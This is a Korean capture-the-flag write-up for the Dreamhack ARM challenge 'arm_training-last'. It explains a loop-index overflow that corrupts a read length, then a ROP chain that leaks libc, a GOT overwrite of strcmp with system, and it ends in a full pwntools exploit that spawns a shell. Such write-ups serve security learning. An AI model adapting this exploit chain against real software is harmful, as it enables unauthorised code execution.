dreamhack arm_training-last
===============

<img width="645" height="281" alt="image" src="https://github.com/user-attachments/assets/46dcef58-5c07-4b71-a165-25d2b1efe217" />

arm_training-last 바이너리를 실행해보면    
1. y,n 입력받기
2. y 입력 시 ~를 계속해서 출력: 사용자가 엔터 입력할때까지 지속적으로 입력도 같이 받음
3. 엔터 시 다시 y,n입력으로 돌아감
4. n 입력 시 사용자에게서 문자열 입력받고 종료

## 바이너리 동작 분석

<img width="561" height="748" alt="image" src="https://github.com/user-attachments/assets/018f47b9-f9b4-44bf-95cb-a2ba5c2973f8" />

먼저 main 함수를 본다.   Y 선택 시 사용자에게서 입력 받는 로직은 input_check 함수에 정의되어 있다.


<img width="391" height="423" alt="image" src="https://github.com/user-attachments/assets/bb80e827-4f8c-4034-96b9-40e6b4f2d5de" />


input_check 함수는 poll()을 통해 사용자 입력을 계속해서 받고 개행에 해당하는 문자가 들어오면 0을 아니면 1을 리턴한다.   
poll의 timeout이 0으로 설정되어 있기 때문에 사용자가 입력을 하지 않고 있으면 대기하지 않고 기존 초기화값인 0을 리턴한다.   

이렇게 알게 된 것을 통해 main 함수의 동작을 요약해보면      
1. y/n 입력받기
2. y 입력 시 ~ 출력뒤 1초 멈추고, input_check 호출
3. 입력이 없을 경우 0반환 후 다시 입력으로 돌아감
4. 입력을 받으면 개행을 입력받을 때까지 getchar로 입력 읽기를 반복. 이후 1 반환 후 다시 y/n 입력받기로 돌아감
5.  n 입력받을 경우 문자열 입력 뒤 종료

## 취약점 분석 - BOF


main에서 입력을 받는 부분은 main 함수의 while 내부, 마지막부분, 그리고 input_check     
여기서 main 의 마지막에 위치한 read를 확인한다.    

<img width="436" height="197" alt="image" src="https://github.com/user-attachments/assets/b30f7344-0df9-4011-ac52-96d74019bef6" />


### 취약점의 흐름

1.  **정상적인 상황**
    * 마지막 read 함수는 `auStack_38` 버퍼(크기 20)에 `local_d` 만큼 입력을 받는다.
    * 초기에 `local_d`는 0x14로 설정되어 있어 초기 상태에서는 오버플로우가 불가능하다.

2.  **취약점 트리거**
    * do-while 루프에서 `abStack_24` 배열에 ~ (0x7e) 문자를 계속 쓴다.
    * 이때 인덱스로 쓰이는 `local_c`에 대한 **상한값 검사가 없다.**

3.  **공격 방법**
    * 스택 상에서 `abStack_24`는 `local_d`보다 낮은 주소에 위치한다. (오프셋 차이는 23바이트)
    * 루프를 충분히 반복시켜 ~ 문자를 24개 이상 쓰면 스택 위의 **`local_d` 변수 영역까지 침범**해 값을 덮어 쓸 수있다.
    * `local_d`의 값이 원래의 `20`에서 ~의 아스키 코드 값인 `126` (0x7E)으로 변조된다.
    * 마지막 `read(0, auStack_38, (uint)local_d)`가 실행될 때 길이 인자가 126으로 바뀐 상태가 된다.
    * 20바이트 크기의 `auStack_38`에 126바이트를 입력할 수 있게 되어 리턴 주소를 덮어쓰는 bof가 가능해진다.




### 익스플로잇 

1. y 입력
2. ~ 가 24개 이상 입력 될때까지 대기
3. 0x34 바이트만큼 더미 값 입력
4. 원하는 리턴 주소 입력

이 시나리오를 따라 코드를 작성할 수 있다.


## libc 릭

주어진 바이너리에서 쉘을 실행시킬 가젯이 존재하지 않으므로 system 이용해서 쉘을 따야 한다.   

<img width="620" height="251" alt="image" src="https://github.com/user-attachments/assets/d68388dd-f6d2-4f93-a97d-940f5c9c26e2" />

바이너리에서 puts를 사용할 수 있다. 0x107d8을 해결해보면 puts함수 호출 후 read 함수까지 연속으로 호출해주고 있다는 것을 확인할 수 있다.   
이를 이용할 수 있다.


### puts로 libc 릭

<img width="1448" height="535" alt="image" src="https://github.com/user-attachments/assets/816f7280-89f6-4b73-883b-c5eb7c024834" />

ropper --file ./arm_training-last --nocolor | grep "r0" 으로 r0을 조작할 수 있는 가젯이 있는지 찾아본다.    
직접 r0을 조작할 수는 없지만 표시해 둔 가젯이 간접적으로 조작이 가능하다.   
이 가젯은 r3의 값에 의존하므로 r3을 조작할 수 있는 가젯을 찾아본다.


<img width="995" height="395" alt="image" src="https://github.com/user-attachments/assets/e3014123-febb-4f4f-b8db-d1deaa01f57a" />

위의 두 가젯을 연속으로 사용해서 r0의 값을 조작할 수 있다.  릭할 값으로는 0x2105c에 존재하는 stdout을 사용할 예정이다.


### rop 수행

<img width="547" height="267" alt="image" src="https://github.com/user-attachments/assets/71eb263f-25c2-4780-b067-bce7f1b90581" />

다시 돌아가서 0x107d8을 보면       
* ldrb   r2,[r11 ,#local_d ] 에 의해 3번째 길이 인자가
* sub r3,r11 ,#0x34와 cpy  r1,r3에 의해 2번째 버퍼 주소 인자가

설정되는 것을 볼 수 있다.    

즉 fp를 조작하면    
* fp=addr+0x이고
* 충분히 큰 (uchar)[fp - 0x9]    
인 addr 주소에 원하는 값을 쓸 수 있다.


위에서 확인한 0x106e4 가젯을 다시 확인하면 r0과 함께 fp도 조작이 가능하다는 것을 확인가능하다.

### 어디에 덮을지 찾기 

<img width="1002" height="286" alt="image" src="https://github.com/user-attachments/assets/6fd2e6f3-3622-4edb-bfb0-a01c90359d58" />

gdb에서 vmmap 이용해서 쓰기가 가능한 영역을 확인한다.    
사용 가능 영역이 0x21000부터 0x22000 이라는 것을 알 수 있다.    

이 영역 안에 got가 존재하므로 **GOT overwrite**를 해야 한다.    

<img width="1116" height="260" alt="image" src="https://github.com/user-attachments/assets/cf74c766-67f5-41ef-9e98-1d5af56da257" />

gdb로 해당 영역에서 적당한 fp 값을 살펴본다. 이중 0x2103b를 사용하겠다.

<img width="482" height="101" alt="image" src="https://github.com/user-attachments/assets/87271d1b-d511-43e1-baa1-2771426bc6d6" />


### 무엇을 덮을지 찾기

이제 system 주소를 어디에 넣을지 찾아야 한다. 다시 ghidra로 돌아가서 main을 확인해본다.   

<img width="600" height="157" alt="image" src="https://github.com/user-attachments/assets/51979c4d-ca48-4a4e-8c85-05e084544b80" />

strcmp 호출 직전에 r0을 세팅하고 있다. 즉 r3을 조작하는 가젯을 붙여서 써서 좀더 편하게 인자를 조정할 수 있다.   

<img width="508" height="247" alt="image" src="https://github.com/user-attachments/assets/389c6cb6-fc36-4e41-bfcb-309b3b70acfe" />

다시 0x107d8로 돌아가보면 그 아래서 sub sp,r11,#0x4를 통해 sp를 fp-0x4로 바꾸는 것을 확인할 수 있다.  
sp는 0x21037에 위치하고, 000107fc  ldmia sp!,{r11 ,pc} 에서는 fp와 리턴 주소를 호출할 것이다.



## 최종 익스플로잇 시나리오

1. bof 트리거 수행
2. 가젯 사용해서 r0, fp 세팅후 puts 위치로 리턴
3. 페이로드
4. 출력된 정보로 libc 릭하고 system 주소 구하기
5. 0x21010(strcmp got)에 system 주소, 0x21038에 fp주소, r0="bin/sh"을 세팅하는 가젯과 strcmp 호출을 위한 0x1074c 주소 덮어쓰기


 ## 코드

 


from pwn import *

def slog(n, m): return success(' : '.join([n, hex(m)]))

context.log_level = 'debug'
isRemote = False
isDebug = False

if isRemote:
    p = remote('host3.dreamhack.games', 0000)
else:
    if isDebug:
        p = process(['qemu-arm-static', '-g', '54321', './arm_training-last'])
    else: 
        p = process('./arm_training-last')


e = ELF("./arm_training-last")
libc = ELF("./libc.so.6")

p.sendlineafter(b') ', b'y')
for i in range(28):
    p.recvuntil(b'~')
p.sendline(b'')

p.sendlineafter(b') ', b'n')

mov_r0_r3 = 0x106e4
pop_r3_pc = 0x10480

payload = b'A'*52
payload += p32(pop_r3_pc)
payload += p32(0x21010)
payload += p32(mov_r0_r3)
payload += p32(0x2103b)
payload += p32(0x107d8)
p.sendafter(b'!!\n', payload)

libc_base = u32(p.recv(4)) - libc.symbols['strcmp']
slog('libc_base', libc_base)
p.recv(1024)

system = libc_base + libc.symbols['system']
read = libc_base + libc.symbols['read']
binsh = libc_base + list(libc.search(b'/bin/sh'))[0]

payload = b'A'
payload += flat([0,0,system,0,read,0,0,0,0,0,0,0])
payload += b'\x18\x02\x00'
payload += p32(pop_r3_pc)
payload += p32(0x21800)
payload += p32(0x107e4)
p.send(payload)

pause()
payload = b''
payload += p32(pop_r3_pc)
payload += p32(binsh)
payload += p32(0x1074c)
p.send(payload)

p.interactive()



